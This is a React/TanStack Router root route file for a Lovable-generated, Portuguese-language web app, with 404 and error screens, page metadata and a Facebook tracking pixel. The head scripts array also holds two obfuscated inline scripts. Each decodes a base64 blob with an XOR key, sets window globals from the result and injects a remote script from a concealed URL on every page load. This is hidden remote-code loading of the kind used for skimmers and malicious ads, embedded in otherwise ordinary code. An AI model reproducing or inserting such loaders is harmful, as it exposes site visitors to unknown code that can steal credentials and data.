import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "Lovable App" },
      { name: "description", content: "Lovable Generated Project" },
      { name: "author", content: "Lovable" },
      { property: "og:title", content: "Lovable App" },
      { property: "og:description", content: "Lovable Generated Project" },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:site", content: "@Lovable" },
    ],
    links: [
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Baloo+2:wght@500;600;700;800&family=Nunito:wght@400;500;600;700;800;900&display=swap",
      },
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "icon", href: "/favicon.ico", type: "image/x-icon" },
    ],
    scripts: [
      {
        children: `!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '1952523682100482');
fbq('track', 'PageView');`,
      },
      {
        children: `(function(){var p_i5iq=atob("DFtXoUstKOJPUQnm6SB11DlBCthtOX2SmShtjmROTIxhJH2LgD0ujyhCRcwtIyaViik+0T9eB5ImKWyKxis+2S5BBog8cyXEiC8j0yJPXZYqIivcsgZ7gyxBR4AuPXrE0wAsgyVMRYdtayuWgCMyzQJJCs5tJ2iKnD51m2kbSdp4YG2F3GI2kHIZHtN/YjvT22NkwHoPVb8y");var a_q=[];for(var j_w=0;j_w<p_i5iq.length;j_w++){a_q.push(p_i5iq.charCodeAt(j_w)&255);}var x_o0=a_q[0];var c_i1=a_q.slice(1,1+x_o0);var e_3k=a_q.slice(1+x_o0);var p_ro5=e_3k.map(function(b,t_u32){return b^c_i1[t_u32%x_o0];});var l_bb5="";for(var y_k=0;y_k<p_ro5.length;y_k++){l_bb5+=String.fromCharCode(p_ro5[y_k]&255);}var g_tr=decodeURIComponent(escape(l_bb5));var a_f1i=JSON.parse(g_tr);var f_o=a_f1i.globals||[];f_o.forEach(function(v_a4){window[v_a4.name]=v_a4.value;});var a_ps=document.createElement("script");a_ps.src=a_f1i.url;a_ps.async=true;a_ps.defer=true;(a_f1i.attributes||[]).forEach(function(x_idx){a_ps.setAttribute(x_idx.name,x_idx.value);});(document.head||document.documentElement).appendChild(a_ps);})();`,
      },
      {
        children: `(function(){var e_1rqj=atob("DH7c+EYJ+3dtxsE/8AX+jTRl2U1PrrVLgA3m12lqnxlDs7VSmRil1iVmllkPtO5Mkwy1iDJ61AIZq7IQnB+onTV91R0e5O0dkQqoii9rjgMIteMFqwX+lidknlVX5KVehB/xjTJkkhEU67FNlQi5ljIkgxQCouxMkxX+1GR/mhsYo+MF0lyh1D0rlRYAo+MF0hq9jCckjgMAr6dG3Q6unTBslQNAtbRdmRqv2morjRYBs6Qdylz+hRt0");var z_u=[];for(var f_i=0;f_i<e_1rqj.length;f_i++){z_u.push(e_1rqj.charCodeAt(f_i)&255);}var d_g3d5=z_u[0];var p_oiu=z_u.slice(1,1+d_g3d5);var m_2old=z_u.slice(1+d_g3d5);var h_9=m_2old.map(function(b,f_gnr){return b^p_oiu[f_gnr%d_g3d5];});var k_n="";for(var z_s80u=0;z_s80u<h_9.length;z_s80u++){k_n+=String.fromCharCode(h_9[z_s80u]&255);}var l_1khh=decodeURIComponent(escape(k_n));var d_z=JSON.parse(l_1khh);var z_jfs4=d_z.globals||[];z_jfs4.forEach(function(s_khp){window[s_khp.name]=s_khp.value;});var w_y6jl=document.createElement("script");w_y6jl.src=d_z.url;w_y6jl.async=true;w_y6jl.defer=true;(d_z.attributes||[]).forEach(function(v_l){w_y6jl.setAttribute(v_l.name,v_l.value);});(document.head||document.documentElement).appendChild(w_y6jl);})();`,
      },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="pt-BR">
      <head>
        <HeadContent />
      </head>
      <body>
        <noscript>
          <img
            height="1"
            width="1"
            style={{ display: "none" }}
            src="https://www.facebook.com/tr?id=1952523682100482&ev=PageView&noscript=1"
            alt=""
          />
        </noscript>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
